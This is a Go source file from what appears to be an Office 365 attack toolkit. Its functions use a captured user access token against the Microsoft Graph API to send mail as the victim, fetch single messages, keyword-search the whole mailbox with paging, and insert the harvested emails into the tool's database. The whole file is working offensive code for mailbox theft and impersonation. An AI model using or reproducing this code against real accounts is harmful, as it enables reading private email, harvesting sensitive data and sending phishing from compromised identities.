package api

import (
	"encoding/json"
	"fmt"
	"log"
	"net/url"
	"o365-attack-toolkit/database"
	"o365-attack-toolkit/model"
	"strings"
)

// SendEmail will send an email using the api
func SendEmail(user model.User, email model.SendEmailStruct) (string, int) {

	data, _ := json.Marshal(email)
	resp, code := CallAPIMethod("POST", "/me/sendMail", user.AccessToken, "", []byte(data), "application/json")

	return resp, code
	//log.Printf("E-mail to : %s responded with status code: %d", email.Message.ToRecipients[0].EmailAddress.Address, respcode)
}

func GetEmailById(user model.User, emailID string) model.SingleMail {

	additionalParameters := url.Values{}
	additionalParameters.Add("select", "receivedDateTime,hasAttachments,importance,subject,sender,bodyPreview,body")
	endpoint := fmt.Sprintf("/me/messages/%s?", emailID)
	messageResponse, _ := CallAPIMethod("GET", endpoint, user.AccessToken, additionalParameters.Encode(), nil, "")
	mail := model.SingleMail{}
	json.Unmarshal([]byte(messageResponse), &mail)
	return mail

}

func GetKeywordEmails(user model.User, searchKeyword string, insertInDB bool) []model.Mail {

	dbMails := []model.Mail{}

	//keyWords := strings.Split(searchKeywords, ",")

	additionalParameters := url.Values{}
	additionalParameters.Add("select", "receivedDateTime,hasAttachments,importance,subject,sender,bodyPreview,body,toRecipients")
	additionalParameters.Add("$search", searchKeyword)

	messagesResponse, _ := CallAPIMethod("GET", "/me/messages?", user.AccessToken, additionalParameters.Encode(), nil, "")
	messages := model.Messages{}

	json.Unmarshal([]byte(messagesResponse), &messages)

	// Loads the first batch of emails.
	for _, message := range messages.Value {
		dbMails = append(dbMails, model.Mail{message.ID, user.Mail, message.Subject, message.Sender.EmailAddress.Address, message.Sender.EmailAddress.Name, message.HasAttachments, message.BodyPreview, message.Body.ContentType, message.Body.Content, message.ToRecipients[0].EmailAddress.Address, message.ToRecipients[0].EmailAddress.Name})
	}

	for messages.OdataNextLink != "" {
		endpoint := strings.Replace(messages.OdataNextLink, model.ApiEndpointRoot, "", -1)
		//fmt.Println(endpoint)
		messagesResponse, _ = CallAPIMethod("GET", endpoint, user.AccessToken, "", nil, "")

		messages = model.Messages{}
		json.Unmarshal([]byte(messagesResponse), &messages)
		// Load next batch of emails
		for _, message := range messages.Value {
			dbMails = append(dbMails, model.Mail{message.ID, user.Mail, message.Subject, message.Sender.EmailAddress.Address, message.Sender.EmailAddress.Name, message.HasAttachments, message.BodyPreview, message.Body.ContentType, message.Body.Content, message.ToRecipients[0].EmailAddress.Address, message.ToRecipients[0].EmailAddress.Name})
		}
	}

	if insertInDB {
		log.Printf("Inserting %d keyworded emails from %s", len(dbMails), user.Mail)
		for _, mail := range dbMails {
			database.InsertEmail(mail)
		}
	}
	return dbMails

}
